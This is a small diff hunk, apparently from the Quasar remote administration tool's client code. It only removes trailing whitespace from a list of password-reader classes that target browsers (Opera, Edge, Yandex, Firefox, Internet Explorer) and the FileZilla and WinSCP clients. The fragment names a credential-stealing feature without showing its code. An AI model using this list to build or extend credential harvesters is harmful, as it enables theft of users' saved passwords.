@@ -37,10 +37,10 @@ namespace Quasar.Client.Messages
                 new OperaPassReader(),
                 new OperaGXPassReader(),
                 new EdgePassReader(),
-                new YandexPassReader(), 
-                new FirefoxPassReader(), 
-                new InternetExplorerPassReader(), 
-                new FileZillaPassReader(), 
+                new YandexPassReader(),
+                new FirefoxPassReader(),
+                new InternetExplorerPassReader(),
+                new FileZillaPassReader(),
                 new WinScpPassReader()
             };
 
